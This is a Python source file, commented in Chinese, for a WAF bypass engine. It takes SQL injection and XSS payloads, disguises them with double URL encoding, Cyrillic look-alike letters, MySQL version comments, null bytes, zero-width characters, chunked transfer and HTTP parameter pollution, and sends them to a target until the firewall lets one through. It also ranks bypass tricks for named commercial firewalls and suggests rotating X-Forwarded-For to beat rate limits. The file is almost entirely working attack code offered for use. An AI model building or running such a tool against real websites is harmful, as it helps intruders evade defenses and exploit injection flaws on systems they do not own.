#!/usr/bin/env python3
"""
WAF Bypass — WAF 绕过模块
不只是检测 WAF 然后降速，而是真正尝试绕过

绕过策略：
1. 编码变异 — URL编码/双重编码/Unicode/HTML实体
2. 大小写混淆 — SeLeCt/UNION
3. 注释插入 — SE/**/LECT, /*!50000SELECT*/
4. 分块传输 — Transfer-Encoding: chunked
5. HTTP 方法变换 — POST 转 PUT/PATCH
6. Content-Type 变换 — JSON/XML/multipart
7. 参数污染 — HPP (HTTP Parameter Pollution)
8. 请求走私特征 — CL-TE / TE-CL hints
9. Unicode 规范化绕过
10. 零宽字符/不可见字符插入
"""

import asyncio
import random
import string
from urllib.parse import quote, quote_plus, unquote
from typing import Optional

from http_engine import HttpEngine, HttpResponse


# ═══════════════════════════════════════════════════════════════
# WAF 绕过策略
# ═══════════════════════════════════════════════════════════════

class WAFBypass:
    """
    WAF 绕过引擎
    
    用法:
        bypass = WAFBypass(http_engine)
        
        # 自动选择绕过方式
        result = await bypass.send_with_bypass(
            url="https://target.com/search?q=test",
            param="q",
            payload="' OR '1'='1",
            waf_type="cloudflare"
        )
        
        # 测试哪种绕过有效
        effective = await bypass.probe_bypass_methods(url, param, payload)
    """

    def __init__(self, http_engine: HttpEngine, config: dict = None):
        self.http = http_engine
        self.config = config or {}
        
        # 各 WAF 的已知绕过优先级
        self.waf_strategies = {
            "cloudflare": ["chunked", "unicode", "case_mix", "comment_inject", "hpp"],
            "aliyun": ["double_encode", "unicode", "comment_inject", "content_type", "case_mix"],
            "baota": ["case_mix", "path_variation", "double_encode", "null_byte"],
            "tencent": ["unicode", "double_encode", "chunked", "comment_inject"],
            "modsecurity": ["comment_inject", "case_mix", "unicode", "hpp"],
            "unknown": ["case_mix", "double_encode", "unicode", "comment_inject", "hpp", "chunked"],
        }

    # ─── 主入口：带绕过发送 ────────────────────────────────────

    async def send_with_bypass(
        self,
        url: str,
        param: str,
        payload: str,
        waf_type: str = "unknown",
        method: str = "GET",
        cookies: dict = None,
        headers: dict = None,
    ) -> dict:
        """
        尝试用各种绕过方式发送 payload
        
        返回:
            {
                "success": bool,
                "bypass_method": str,
                "response": HttpResponse,
                "mutated_payload": str,
            }
        """
        strategies = self.waf_strategies.get(waf_type, self.waf_strategies["unknown"])

        for strategy_name in strategies:
            mutator = self._get_mutator(strategy_name)
            if not mutator:
                continue

            mutated = mutator(payload)
            
            # 有些策略改的是 headers/body 而不是 payload
            extra_headers = headers or {}
            req_method = method
            
            if strategy_name == "chunked":
                extra_headers = {**(headers or {}), "Transfer-Encoding": "chunked"}
            elif strategy_name == "content_type":
                extra_headers = {**(headers or {}), "Content-Type": "application/json"}
                req_method = "POST"
            elif strategy_name == "hpp":
                # HTTP Parameter Pollution: 同名参数多次传
                mutated = payload  # 原始 payload
                # 在 URL 中加入多个同名参数
                url_with_hpp = self._add_hpp(url, param, payload)
                resp = await self.http.request(
                    req_method, url_with_hpp,
                    headers=extra_headers, cookies=cookies
                )
                if resp.status_code == 200 and not self._is_waf_blocked(resp):
                    return {
                        "success": True,
                        "bypass_method": strategy_name,
                        "response": resp,
                        "mutated_payload": f"HPP: {url_with_hpp}",
                    }
                continue

            # 发送变异后的 payload
            diffs = await self.http.diff_responses(
                url=url,
                param=param,
                payloads=[mutated],
                method=req_method,
                extra_headers=extra_headers,
                cookies=cookies,
            )

            if diffs and diffs[0].response:
                resp = diffs[0].response
                if not self._is_waf_blocked(resp):
                    return {
                        "success": True,
                        "bypass_method": strategy_name,
                        "response": resp,
                        "mutated_payload": mutated,
                    }

        return {
            "success": False,
            "bypass_method": None,
            "response": None,
            "mutated_payload": None,
        }

    # ─── 探测有效绕过方法 ──────────────────────────────────────

    async def probe_bypass_methods(
        self,
        url: str,
        param: str,
        payload: str,
        cookies: dict = None,
    ) -> list[dict]:
        """
        测试所有绕过方法，返回有效的
        """
        effective = []
        all_methods = [
            "url_encode", "double_encode", "unicode",
            "case_mix", "comment_inject", "null_byte",
            "newline_inject", "concat_break", "hpp",
            "chunked", "zero_width",
        ]

        for method_name in all_methods:
            mutator = self._get_mutator(method_name)
            if not mutator:
                continue

            mutated = mutator(payload)
            
            diffs = await self.http.diff_responses(
                url=url, param=param, payloads=[mutated], cookies=cookies
            )

            if diffs and diffs[0].response:
                resp = diffs[0].response
                blocked = self._is_waf_blocked(resp)
                effective.append({
                    "method": method_name,
                    "mutated_payload": mutated[:100],
                    "status": resp.status_code,
                    "blocked": blocked,
                    "length": resp.content_length,
                })

        # 按是否被拦截排序（未拦截的在前）
        effective.sort(key=lambda x: x["blocked"])
        return effective

    # ─── 变异器 ────────────────────────────────────────────────

    def _get_mutator(self, name: str):
        """获取变异方法"""
        mutators = {
            "url_encode": self._mutate_url_encode,
            "double_encode": self._mutate_double_encode,
            "unicode": self._mutate_unicode,
            "case_mix": self._mutate_case_mix,
            "comment_inject": self._mutate_comment_inject,
            "null_byte": self._mutate_null_byte,
            "newline_inject": self._mutate_newline,
            "concat_break": self._mutate_concat_break,
            "zero_width": self._mutate_zero_width,
            "hex_encode": self._mutate_hex_encode,
            "chunked": self._mutate_identity,  # chunked 改的是 header 不是 payload
            "content_type": self._mutate_identity,
            "hpp": self._mutate_identity,
            "path_variation": self._mutate_identity,
        }
        return mutators.get(name)

    def _mutate_url_encode(self, payload: str) -> str:
        """单层 URL 编码"""
        return quote(payload)

    def _mutate_double_encode(self, payload: str) -> str:
        """双重 URL 编码"""
        return quote(quote(payload))

    def _mutate_unicode(self, payload: str) -> str:
        """Unicode 编码变异"""
        result = ""
        sql_keywords = ["select", "union", "from", "where", "and", "or", "sleep", "waitfor"]
        
        for char in payload:
            if char.lower() in "aeiou" and random.random() > 0.5:
                # 随机对元音使用 Unicode 等价字符
                unicode_map = {
                    'a': '\u0430', 'e': '\u0435', 'i': '\u0456',
                    'o': '\u043e', 'u': '\u0075',
                    'A': '\u0410', 'E': '\u0415', 'I': '\u0406',
                    'O': '\u041e', 'U': '\u0055',
                }
                result += unicode_map.get(char, char)
            else:
                result += char
        return result

    def _mutate_case_mix(self, payload: str) -> str:
        """随机大小写"""
        sql_keywords = ["select", "union", "from", "where", "and", "or",
                       "sleep", "waitfor", "delay", "concat", "substr",
                       "script", "alert", "onerror", "onload"]
        
        result = payload
        for keyword in sql_keywords:
            if keyword.lower() in result.lower():
                mixed = ''.join(
                    c.upper() if random.random() > 0.5 else c.lower()
                    for c in keyword
                )
                result = re.sub(keyword, mixed, result, flags=re.IGNORECASE)
        return result

    def _mutate_comment_inject(self, payload: str) -> str:
        """SQL 注释插入"""
        sql_keywords = ["SELECT", "UNION", "FROM", "WHERE", "AND", "OR",
                       "INSERT", "UPDATE", "DELETE", "DROP", "EXEC"]
        
        result = payload
        for keyword in sql_keywords:
            if keyword.lower() in result.lower():
                # 在关键词中间插入注释
                mid = len(keyword) // 2
                broken = keyword[:mid] + "/**/" + keyword[mid:]
                result = re.sub(keyword, broken, result, flags=re.IGNORECASE)
                break  # 只破坏一个关键词，避免过度变异
        
        # MySQL 版本注释
        result = result.replace("SELECT", "/*!50000SELECT*/")
        result = result.replace("UNION", "/*!50000UNION*/")
        
        return result

    def _mutate_null_byte(self, payload: str) -> str:
        """Null 字节插入"""
        # 在关键检测点前插入 %00
        return payload.replace("<", "%00<").replace("'", "%00'")

    def _mutate_newline(self, payload: str) -> str:
        """换行符插入（绕过基于行的检测）"""
        return payload.replace(" ", "%0a").replace("<", "%0a<")

    def _mutate_concat_break(self, payload: str) -> str:
        """字符串拼接打断"""
        # SQL: 'ad'+'min' 或 CONCAT('ad','min')
        if "admin" in payload.lower():
            payload = payload.replace("admin", "ad'+'min")
        if "select" in payload.lower():
            payload = payload.replace("select", "sel'+'ect")
        return payload

    def _mutate_zero_width(self, payload: str) -> str:
        """零宽字符插入（绕过关键词匹配）"""
        zwc = '\u200b'  # Zero Width Space
        
        # 在 HTML 标签中的关键词里插入零宽字符
        keywords = ["script", "onerror", "onload", "alert", "eval"]
        result = payload
        for kw in keywords:
            if kw in result.lower():
                # 在关键词中间插入零宽字符
                mid = len(kw) // 2
                broken = kw[:mid] + zwc + kw[mid:]
                result = result.replace(kw, broken)
                break
        return result

    def _mutate_hex_encode(self, payload: str) -> str:
        """十六进制编码"""
        return ''.join(f'%{ord(c):02x}' for c in payload)

    def _mutate_identity(self, payload: str) -> str:
        """不变异（用于 chunked/content_type 等改 header 的策略）"""
        return payload

    # ─── 辅助方法 ─────────────────────────────────────────────

    def _is_waf_blocked(self, resp: HttpResponse) -> bool:
        """判断响应是否是 WAF 拦截"""
        if resp.status_code in (403, 406, 419, 429, 503):
            return True
        
        # 检查响应体中的 WAF 特征
        waf_indicators = [
            "access denied", "forbidden", "blocked",
            "not acceptable", "request rejected",
            "security violation", "waf", "firewall",
            "cloudflare", "incapsula", "sucuri",
            "请求被拦截", "访问被拒绝", "安全验证",
            "人机验证", "滑块验证", "captcha",
        ]
        
        body_lower = resp.body.lower() if resp.body else ""
        for indicator in waf_indicators:
            if indicator in body_lower:
                return True
        
        return False

    def _add_hpp(self, url: str, param: str, payload: str) -> str:
        """HTTP Parameter Pollution"""
        from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
        
        parsed = urlparse(url)
        # 添加同名参数：正常值 + payload
        # 不同框架处理方式不同：ASP取最后一个，PHP取最后，Flask取第一个
        new_query = f"{param}=test&{param}={quote(payload)}"
        if parsed.query:
            new_query = parsed.query + "&" + new_query
        
        return urlunparse(parsed._replace(query=new_query))

    def get_bypass_suggestions(self, waf_type: str) -> list[str]:
        """获取针对特定 WAF 的绕过建议"""
        suggestions = {
            "cloudflare": [
                "使用 chunked transfer encoding",
                "Unicode 规范化绕过 (Cyrillic 字符替换)",
                "利用 Cloudflare 的 cache 规则（静态文件后缀不检测）",
                "Browser Integrity Check 绕过需要真实浏览器指纹",
            ],
            "aliyun": [
                "双重 URL 编码绕过",
                "MySQL 版本注释 /*!50000SELECT*/",
                "Content-Type 变换（multipart 不检测 body）",
                "频率限制绕过：X-Forwarded-For 轮换",
            ],
            "baota": [
                "路径大小写绕过 (/Admin vs /admin)",
                "URL 路径规范化绕过 (/admin/../admin/)",
                "规则较弱，基础大小写混淆即可",
            ],
            "tencent": [
                "Unicode 编码绕过",
                "SQL注入 payload 需分段编码",
                "chunked 传输绕过",
            ],
        }
        return suggestions.get(waf_type, suggestions.get("cloudflare", []))


# 需要 import re
import re
